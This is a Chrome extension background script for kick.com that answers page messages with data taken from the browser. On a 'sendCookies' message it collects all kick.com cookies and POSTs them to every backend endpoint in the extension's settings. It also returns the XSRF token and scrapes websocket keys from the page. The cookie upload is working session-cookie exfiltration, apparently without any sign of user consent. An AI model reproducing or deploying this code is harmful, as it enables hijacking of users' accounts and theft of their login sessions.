import { GlobalSetting } from "../classes-shared/Settings";
import {execScript} from './helpers'

chrome.runtime.onMessage.addListener(async (data, sender, sendResponse) => {
    if (data.type === "token"){
        chrome.cookies.get({name:"XSRF-TOKEN", url:"https://kick.com"})
        .then(token=>{
            chrome.tabs.sendMessage(sender.tab.id, {type:"token", message:token?.value})
        })
    }else if (data.type === "sendCookies"){
        chrome.cookies.getAll({url:"https://kick.com"})
        .then(tokens => {
            console.log(tokens)
            //get backend endpoints
            GlobalSetting.ENDPOINTS.Get().then(endpoints =>{
                for (let endpoint of endpoints){
                    const userData = {
                        username: "test",
                        cookies: tokens
                    }
                    const options = {
                        "body": JSON.stringify(userData),
                        "method": "POST"
                    };
                    fetch(endpoint, options)
                    .then(res => res.json())
                    .then(res => console.log(res))
                    .catch(err => console.error(err));
                }
            })
        })
    
    }else if (data.type === "request_websocket_info"){
        //get websocket options and send to backend
        execScript(null, ()=>{
            return window.Echo.options
        }).then(wsOptions=>{
            let wsCluster = wsOptions.cluster
            let wsKey = wsOptions.key
            chrome.tabs.sendMessage(sender.tab.id, {type:"send_websocket_info", message:{wsCluster, wsKey}})
            
        })
        .catch(err => console.error(err))
    }
    else{
        return true;
    }
    
});
//{"event":"App\Events\FollowersUpdated","data":"{"followersCount":2,"channel_id":1106831,"username":null,"created_at":1676943288,"followed":true}","channel":"channel.1106831"}
//{"event":"App\Events\FollowersUpdatedForChannelOwner","data":"{"followersCount":2,"channel_id":1106831,"username":"enzonik","created_at":1676943176,"followed":true}","channel":"private-channel.1106831"}
